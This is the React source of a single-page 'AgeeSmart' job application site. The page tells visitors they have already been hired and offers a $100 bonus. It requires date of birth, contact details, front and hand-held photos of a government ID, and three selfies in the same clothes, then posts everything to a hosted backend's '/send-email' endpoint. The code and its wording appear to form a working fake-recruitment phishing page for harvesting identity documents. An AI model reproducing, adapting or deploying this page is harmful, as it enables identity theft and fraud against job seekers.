import React, { useState, useEffect } from "react";
import { Facebook, Instagram, Twitter, Loader2 } from "lucide-react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const App = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    applyingPosition: "",
    email: "",
    dateOfBirth: "",
    phoneNumber: "",
    mobileNumber: "",
    addressLine1: "",
    city: "",
    zipCode: "",
    country: "",
    idFileFront: null,
    idFileBack: null,
    selfie1: null,
    selfie2: null,
    selfie3: null,
  });
  const [currentSlide, setCurrentSlide] = useState(0);
  const [countries, setCountries] = useState([]);
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    fetch("https://restcountries.com/v3.1/all?fields=name")
      .then(response => response.json())
      .then(data => setCountries(data.map(country => country.name.common)))
      .catch(error => {
        console.error("Error fetching countries:", error);
        toast.error("Failed to fetch countries. Please try again later.", {
          position: "top-right",
          autoClose: 5000,
        });
      });
  }, []);

  const slides = ["./carousel01.jpg", "./carousel02.jpg", "./carousel03.jpg"];

  const handleInputChange = e => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleFileChange = e => {
    const { name, files } = e.target;
    const maxSize = 2 * 1024 * 1024; // 2MB in bytes
    if (files[0] && files[0].size > maxSize) {
      setError(`File ${files[0].name} exceeds 2MB limit.`);
      toast.error(
        `File ${files[0].name} exceeds 2MB limit. Please upload a smaller file.`,
        {
          position: "top-right",
          autoClose: 5000,
        }
      );
      e.target.value = null; // Clear the input
      return;
    }
    setError("");
    setFormData({ ...formData, [name]: files[0] });
  };

  const truncateFileName = (name, maxLength = 20) => {
    if (!name) return "No file chosen";
    if (name.length <= maxLength) return name;
    const ext = name.split(".").pop();
    const base = name.substring(0, maxLength - ext.length - 3);
    return `${base}...${ext}`;
  };

  const handleSubmit = async e => {
    e.preventDefault();
    if (error) {
      toast.warn("Please resolve file size errors before submitting.", {
        position: "top-right",
        autoClose: 5000,
      });
      return;
    }

    const {
      firstName,
      lastName,
      applyingPosition,
      email,
      dateOfBirth,
      phoneNumber,
      idFileFront,
      idFileBack,
      selfie1,
      selfie2,
      selfie3,
    } = formData;
    if (
      !firstName ||
      !lastName ||
      !applyingPosition ||
      !email ||
      !dateOfBirth ||
      !phoneNumber ||
      !idFileFront ||
      !idFileBack ||
      !selfie1 ||
      !selfie2 ||
      !selfie3
    ) {
      toast.error(
        "Please fill all required fields and upload all required files.",
        {
          position: "top-right",
          autoClose: 5000,
        }
      );
      return;
    }

    setIsSubmitting(true);
    setProgress(0);

    const formDataToSend = new FormData();
    Object.entries(formData).forEach(([key, value]) => {
      if (value instanceof File) {
        formDataToSend.append(key, value);
      } else {
        formDataToSend.append(key, value || "");
      }
    });

    try {
      const progressInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 90) {
            return prev;
          }
          return prev + 10;
        });
      }, 500);

      const response = await fetch(
        `${
          import.meta.env.BACKEND_URL || "https://agesmart-backend.onrender.com"
        }/send-email`,
        {
          method: "POST",
          body: formDataToSend,
        }
      );

      clearInterval(progressInterval);
      setProgress(100);

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(errorText);
      }

      toast.success("Application submitted successfully!", {
        position: "top-right",
        autoClose: 5000,
      });
      setFormData({
        firstName: "",
        lastName: "",
        applyingPosition: "",
        email: "",
        dateOfBirth: "",
        phoneNumber: "",
        mobileNumber: "",
        addressLine1: "",
        city: "",
        zipCode: "",
        country: "",
        idFileFront: null,
        idFileBack: null,
        selfie1: null,
        selfie2: null,
        selfie3: null,
      });
    } catch (error) {
      console.error("Error submitting form:", error);
      toast.error(`Failed to submit application: ${error.message}`, {
        position: "top-right",
        autoClose: 5000,
      });
    } finally {
      setIsSubmitting(false);
      setTimeout(() => setProgress(0), 1000);
    }
  };

  const nextSlide = () => {
    setCurrentSlide(prev => (prev + 1) % slides.length);
  };

  const prevSlide = () => {
    setCurrentSlide(prev => (prev - 1 + slides.length) % slides.length);
  };

  return (
    <div className="min-h-screen font-sans bg-gradient-to-br from-gray-50 via-blue-50 to-indigo-100 text-gray-900 transition-all duration-500">
      <ToastContainer />
      <header className="bg-white dark:bg-gray-900 border-b border-gray-200 dark:border-gray-700 shadow-sm top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 text-center">
          <h1 className="text-2xl sm:text-3xl font-semibold text-gray-900 dark:text-white tracking-tight">
            AgeeSmart
          </h1>
        </div>
      </header>

      <section className="relative bg-gradient-to-b from-gray-200 to-gray-300 py-12 sm:py-16">
        <div className="container mx-auto px-4 sm:px-6">
          <div className="relative overflow-hidden rounded-2xl shadow-2xl">
            <div
              className="flex transition-transform duration-1000 ease-in-out"
              style={{ transform: `translateX(-${currentSlide * 100}%)` }}
            >
              {slides.map((slide, index) => (
                <img
                  key={index}
                  src={slide}
                  alt={`Slide ${index + 1}`}
                  loading="lazy"
                  className="min-w-full h-48 sm:h-80 md:h-96 object-cover transform hover:scale-105 transition-transform duration-500"
                />
              ))}
            </div>
            <button
              onClick={prevSlide}
              className="absolute left-2 sm:left-4 top-1/2 transform -translate-y-1/2 bg-white bg-opacity-80 text-indigo-700 p-2 sm:p-3 rounded-full shadow-lg hover:bg-opacity-100 hover:scale-110 transition-all duration-300"
            >
              ←
            </button>
            <button
              onClick={nextSlide}
              className="absolute right-2 sm:right-4 top-1/2 transform -translate-y-1/2 bg-white bg-opacity-80 text-indigo-700 p-2 sm:p-3 rounded-full shadow-lg hover:bg-opacity-100 hover:scale-110 transition-all duration-300"
            >
              →
            </button>
          </div>
        </div>
      </section>

      <main className="container mx-auto px-4 sm:px-6 py-12 sm:py-16">
        <section className="bg-white border-4 border-indigo-200 rounded-2xl shadow-2xl p-8 sm:p-10 mb-12 sm:mb-16 animate-fadeInUp">
          <h2 className="text-xl sm:text-3xl font-bold mb-6 sm:mb-8 text-indigo-900 bg-clip-text bg-gradient-to-r from-indigo-600 to-blue-500">
            Congratulations!
          </h2>
          <p className="text-gray-700 mb-6 text-sm sm:text-base leading-relaxed">
            After reviewing your application, we are pleased to inform you that
            you have been selected to join our team. We are excited to work with
            you and have outlined a few procedures to ensure a seamless
            onboarding experience.
          </p>
          <p className="text-gray-700 mb-6 text-sm sm:text-base leading-relaxed">
            To comply with our corporate policies and verify your eligibility,
            please complete the provided form with all the required information.
            Since we exclusively hire U.S. citizens, we must verify your
            identity using your government ID card or driver’s license. Please
            upload clear, high-quality photos of both the front and back of your
            government ID or driver’s license, along with three selfies wearing
            the same dress to confirm your identity. For reference, you can see
            some examples below (taken with a 16:9 aspect ratio in landscape
            orientation).
          </p>
          <p className="text-gray-700 mb-6 text-sm sm:text-base leading-relaxed">
            Once we have reviewed your information, we will schedule your
            interview within 72 hours and send you an interview link. We will
            arrange a convenient time for your online interview through our
            website-based live interview system.
          </p>
        </section>

        <section className="bg-white border-2 border-indigo-100 rounded-2xl shadow-lg p-8 sm:p-10 mb-12 sm:mb-16 animate-fadeInUp">
          <h2 className="text-xl sm:text-3xl font-bold mb-6 sm:mb-8 text-indigo-900 bg-clip-text bg-gradient-to-r from-indigo-600 to-blue-500">
            Job Application Form
          </h2>
          <p className="text-gray-700 mb-6 text-sm sm:text-base font-semibold">
            Full-Time/Part-time
          </p>
          <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
            Benefits Offered: Competitive salary, Market-leading equity grants,
            Medical, dental, & vision insurance, Unlimited PTO, Bi-annual team
            retreats, Opportunity to grow your biotech network and expertise.
            After completing this assessment, you will shortly receive an
            interview date and time. During the interview, you will receive a
            $100 bonus, and we will provide an offer letter for the position. We
            will also explain your job duties.
          </p>
        </section>

        <h2 className="text-xl sm:text-3xl font-bold mb-6 sm:mb-8 text-indigo-900 bg-clip-text bg-gradient-to-r from-indigo-600 to-blue-500">
          Job Category
        </h2>
        <section className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8 mb-12 sm:mb-16">
          {[
            { title: "Recruiter", desc: "Source and attract top talent." },
            {
              title: "HR Manager",
              desc: "Oversee employee relations and policies.",
            },
            { title: "Teacher", desc: "Educate and inspire learners." },
            {
              title: "Bookkeeper",
              desc: "Manage financial records accurately.",
            },
            { title: "Data Analyst", desc: "Analyze data to drive decisions." },
            { title: "Plumber", desc: "Ensure efficient plumbing systems." },
          ].map((job, index) => (
            <div
              key={index}
              className="bg-gradient-to-br from-indigo-50 to-blue-100 p-6 sm:p-8 rounded-xl shadow-lg hover:shadow-2xl hover:-translate-y-2 transform transition-all duration-300"
            >
              <h3 className="text-lg sm:text-xl font-semibold text-indigo-900 mb-3">
                {job.title}
              </h3>
              <p className="text-gray-600 text-sm sm:text-base">{job.desc}</p>
            </div>
          ))}
        </section>

        <section className="bg-white border-2 border-indigo-100 rounded-2xl shadow-2xl p-8 sm:p-10 animate-fadeInUp">
          <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8">
            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg text-sm sm:text-base">
                {error}
              </div>
            )}
            <div className="flex flex-col sm:flex-row sm:space-x-6">
              <div className="w-full sm:w-1/2 mb-6 sm:mb-0">
                <label
                  htmlFor="firstName"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  First Name
                </label>
                <input
                  type="text"
                  id="firstName"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleInputChange}
                  className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                  required
                />
              </div>
              <div className="w-full sm:w-1/2">
                <label
                  htmlFor="lastName"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Last Name
                </label>
                <input
                  type="text"
                  id="lastName"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleInputChange}
                  className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                  required
                />
              </div>
            </div>
            <div>
              <label
                htmlFor="applyingPosition"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Applying Position <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                id="applyingPosition"
                name="applyingPosition"
                value={formData.applyingPosition}
                onChange={handleInputChange}
                className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                required
              />
            </div>
            <div>
              <label
                htmlFor="email"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Email <span className="text-red-500">*</span>
              </label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                required
              />
            </div>
            <div>
              <label
                htmlFor="dateOfBirth"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Date of Birth <span className="text-red-500">*</span>
              </label>
              <input
                type="date"
                id="dateOfBirth"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleInputChange}
                className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                required
              />
            </div>
            <div>
              <label
                htmlFor="phoneNumber"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Phone Number <span className="text-red-500">*</span>
              </label>
              <input
                type="tel"
                id="phoneNumber"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleInputChange}
                className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                required
              />
            </div>
            <div>
              <label
                htmlFor="mobileNumber"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Mobile Number
              </label>
              <input
                type="tel"
                id="mobileNumber"
                name="mobileNumber"
                value={formData.mobileNumber}
                onChange={handleInputChange}
                className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
              />
            </div>
            <div className="flex flex-col sm:flex-row sm:space-x-6">
              <div className="w-full sm:w-1/2 mb-6 sm:mb-0">
                <label
                  htmlFor="addressLine1"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Address Line 1
                </label>
                <input
                  type="text"
                  id="addressLine1"
                  name="addressLine1"
                  value={formData.addressLine1}
                  onChange={handleInputChange}
                  className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                />
              </div>
              <div className="w-full sm:w-1/2">
                <label
                  htmlFor="city"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  City
                </label>
                <input
                  type="text"
                  id="city"
                  name="city"
                  value={formData.city}
                  onChange={handleInputChange}
                  className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                />
              </div>
            </div>
            <div className="flex flex-col sm:flex-row sm:space-x-6">
              <div className="w-full sm:w-1/2 mb-6 sm:mb-0">
                <label
                  htmlFor="zipCode"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Zip Code
                </label>
                <input
                  type="text"
                  id="zipCode"
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleInputChange}
                  className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                />
              </div>
              <div className="w-full sm:w-1/2">
                <label
                  htmlFor="country"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Country
                </label>
                <select
                  id="country"
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="mt-1 block w-full border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 p-3 text-sm sm:text-base transition-all duration-300"
                >
                  <option value="">Select Country</option>
                  {countries.sort().map(country => (
                    <option key={country} value={country}>
                      {country}
                    </option>
                  ))}
                </select>
              </div>
            </div>
            <div>
              <label
                htmlFor="idFileFront"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                NID Card (Front) <span className="text-red-500">*</span>
              </label>
              <div className="flex flex-col sm:flex-row sm:items-center sm:space-x-4">
                <button
                  type="button"
                  onClick={() => document.getElementById("idFileFront").click()}
                  className="mt-1 bg-gradient-to-r from-red-500 to-pink-500 text-white py-2 px-4 rounded-full hover:from-red-600 hover:to-pink-600 focus:outline-none transition-all duration-300 text-sm sm:text-base"
                >
                  Choose File
                </button>
                <input
                  type="file"
                  id="idFileFront"
                  name="idFileFront"
                  accept="image/*"
                  onChange={handleFileChange}
                  className="hidden"
                  required
                />
                <span className="mt-2 text-gray-500 text-sm sm:text-base truncate max-w-[200px] sm:max-w-[300px]">
                  {truncateFileName(formData.idFileFront?.name)}
                </span>
              </div>
              <p className="mt-2 text-gray-500 text-xs sm:text-sm">
                Maximum file size: 2MB (jpg, jpeg, png formats only)
              </p>
              <div className="mt-4 flex flex-col sm:flex-row sm:space-x-4">
                <img
                  src="./nidFront.jpg"
                  alt="NID Front Example"
                  loading="lazy"
                  className="object-contain h-50 sm:h-40 w-full sm:w-60"
                />
              </div>
            </div>
            <div>
              <label
                htmlFor="idFileBack"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                NID Card Holding in Hands{" "}
                <span className="text-red-500">*</span>
              </label>
              <div className="flex flex-col sm:flex-row sm:items-center sm:space-x-4">
                <button
                  type="button"
                  onClick={() => document.getElementById("idFileBack").click()}
                  className="mt-1 bg-gradient-to-r from-red-500 to-pink-500 text-white py-2 px-4 rounded-full hover:from-red-600 hover:to-pink-600 focus:outline-none transition-all duration-300 text-sm sm:text-base"
                >
                  Choose File
                </button>
                <input
                  type="file"
                  id="idFileBack"
                  name="idFileBack"
                  accept="image/*"
                  onChange={handleFileChange}
                  className="hidden"
                  required
                />
                <span className="mt-2 text-gray-500 text-sm sm:text-base truncate max-w-[200px] sm:max-w-[300px]">
                  {truncateFileName(formData.idFileBack?.name)}
                </span>
              </div>
              <p className="mt-2 text-gray-500 text-xs sm:text-sm">
                Maximum file size: 2MB (jpg, jpeg, png formats only)
              </p>
              <div className="mt-4 flex flex-col sm:flex-row sm:space-x-4">
                <img
                  src="./img3.jpeg"
                  alt="NID Back Example"
                  loading="lazy"
                  className="object-contain w-50 sm:w-40"
                />
              </div>
            </div>
            <div>
              <p className="mt-2 text-red-600 font-medium text-sm sm:text-base">
                Upload three selfie images wearing the same dress.
              </p>
              <div className="mt-4 flex flex-col sm:flex-row sm:space-x-4 space-y-4 sm:space-y-0">
                <img
                  src="./img1.jpeg"
                  alt="Selfie Example 1"
                  loading="lazy"
                  className="object-contain w-50 sm:w-40"
                />
                <img
                  src="./img2.jpeg"
                  alt="Selfie Example 2"
                  loading="lazy"
                  className="object-contain w-50 sm:w-40"
                />
                <img
                  src="./img3.jpeg"
                  alt="Selfie Example 3"
                  loading="lazy"
                  className="object-contain w-50 sm:w-40"
                />
              </div>
              <label
                htmlFor="selfie1"
                className="block text-sm font-medium text-gray-700 mb-2 mt-6"
              >
                Selfie 1 <span className="text-red-500">*</span>
              </label>
              <div className="flex flex-col sm:flex-row sm:items-center sm:space-x-4">
                <button
                  type="button"
                  onClick={() => document.getElementById("selfie1").click()}
                  className="mt-1 bg-gradient-to-r from-red-500 to-pink-500 text-white py-2 px-4 rounded-full hover:from-red-600 hover:to-pink-600 focus:outline-none transition-all duration-300 text-sm sm:text-base"
                >
                  Choose File
                </button>
                <input
                  type="file"
                  id="selfie1"
                  name="selfie1"
                  accept="image/*"
                  onChange={handleFileChange}
                  className="hidden"
                  required
                />
                <span className="mt-2 text-gray-500 text-sm sm:text-base truncate max-w-[200px] sm:max-w-[300px]">
                  {truncateFileName(formData.selfie1?.name)}
                </span>
              </div>
              <p className="mt-2 text-gray-500 text-xs sm:text-sm">
                Maximum file size: 2MB (jpg, jpeg, png formats only)
              </p>
            </div>
            <div>
              <label
                htmlFor="selfie2"
                className="block text-sm font-medium text-gray-700 mb-2 mt-6"
              >
                Selfie 2 <span className="text-red-500">*</span>
              </label>
              <div className="flex flex-col sm:flex-row sm:items-center sm:space-x-4">
                <button
                  type="button"
                  onClick={() => document.getElementById("selfie2").click()}
                  className="mt-1 bg-gradient-to-r from-red-500 to-pink-500 text-white py-2 px-4 rounded-full hover:from-red-600 hover:to-pink-600 focus:outline-none transition-all duration-300 text-sm sm:text-base"
                >
                  Choose File
                </button>
                <input
                  type="file"
                  id="selfie2"
                  name="selfie2"
                  accept="image/*"
                  onChange={handleFileChange}
                  className="hidden"
                  required
                />
                <span className="mt-2 text-gray-500 text-sm sm:text-base truncate max-w-[200px] sm:max-w-[300px]">
                  {truncateFileName(formData.selfie2?.name)}
                </span>
              </div>
              <p className="mt-2 text-gray-500 text-xs sm:text-sm">
                Maximum file size: 2MB (jpg, jpeg, png formats only)
              </p>
            </div>
            <div>
              <label
                htmlFor="selfie3"
                className="block text-sm font-medium text-gray-700 mb-2 mt-6"
              >
                Selfie 3 <span className="text-red-500">*</span>
              </label>
              <div className="flex flex-col sm:flex-row sm:items-center sm:space-x-4">
                <button
                  type="button"
                  onClick={() => document.getElementById("selfie3").click()}
                  className="mt-1 bg-gradient-to-r from-red-500 to-pink-500 text-white py-2 px-4 rounded-full hover:from-red-600 hover:to-pink-600 focus:outline-none transition-all duration-300 text-sm sm:text-base"
                >
                  Choose File
                </button>
                <input
                  type="file"
                  id="selfie3"
                  name="selfie3"
                  accept="image/*"
                  onChange={handleFileChange}
                  className="hidden"
                  required
                />
                <span className="mt-2 text-gray-500 text-sm sm:text-base truncate max-w-[200px] sm:max-w-[300px]">
                  {truncateFileName(formData.selfie3?.name)}
                </span>
              </div>
              <p className="mt-2 text-gray-500 text-xs sm:text-sm">
                Maximum file size: 2MB (jpg, jpeg, png formats only)
              </p>
            </div>
            <div className="space-y-4">
              <button
                type="submit"
                className="w-full bg-gradient-to-r from-indigo-600 to-blue-500 text-white py-3 px-6 rounded-lg shadow-lg hover:from-indigo-700 hover:to-blue-600 focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-300 text-sm sm:text-base flex items-center justify-center"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="animate-spin mr-2 h-5 w-5" />
                    Submitting...
                  </>
                ) : (
                  "Submit Application"
                )}
              </button>
              {isSubmitting && (
                <div className="space-y-2">
                  <div className="w-full bg-gray-200 rounded-full h-2.5">
                    <div
                      className="bg-indigo-600 h-2.5 rounded-full transition-all duration-300"
                      style={{ width: `${progress}%` }}
                    ></div>
                  </div>
                  <p className="text-gray-600 text-xs sm:text-sm text-center">
                    Note: Submission may take some time due to file processing.
                  </p>
                </div>
              )}
            </div>
          </form>
        </section>
      </main>

      <button
        onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
        className="fixed bottom-4 sm:bottom-6 right-4 sm:right-6 bg-gradient-to-r from-indigo-600 to-blue-500 text-white p-3 rounded-full shadow-lg hover:from-indigo-700 hover:to-blue-600 focus:outline-none transition-all duration-300 animate-pulse"
      >
        ↑
      </button>

      <footer className="bg-gradient-to-r from-indigo-900 to-blue-800 text-white py-6 sm:py-8">
        <div className="container mx-auto px-4 sm:px-6 text-center">
          <p className="text-sm sm:text-base">
            &copy; 2025 AgeeSmart. All rights reserved.
          </p>
          <div className="mt-4 flex justify-center space-x-4 sm:space-x-6">
            <a
              href="https://facebook.com"
              target="_blank"
              rel="noopener noreferrer"
              className="text-xl sm:text-2xl hover:text-indigo-300 transform hover:scale-110 transition-all duration-300"
              aria-label="Facebook"
            >
              <Facebook className="w-6 h-6 sm:w-8 sm:h-8" />
            </a>
            <a
              href="https://instagram.com"
              target="_blank"
              rel="noopener noreferrer"
              className="text-xl sm:text-2xl hover:text-indigo-300 transform hover:scale-110 transition-all duration-300"
              aria-label="Instagram"
            >
              <Instagram className="w-6 h-6 sm:w-8 sm:h-8" />
            </a>
            <a
              href="https://x.com"
              target="_blank"
              rel="noopener noreferrer"
              className="text-xl sm:text-2xl hover:text-indigo-300 transform hover:scale-110 transition-all duration-300"
              aria-label="X"
            >
              <Twitter className="w-6 h-6 sm:w-8 sm:h-8" />
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default App;
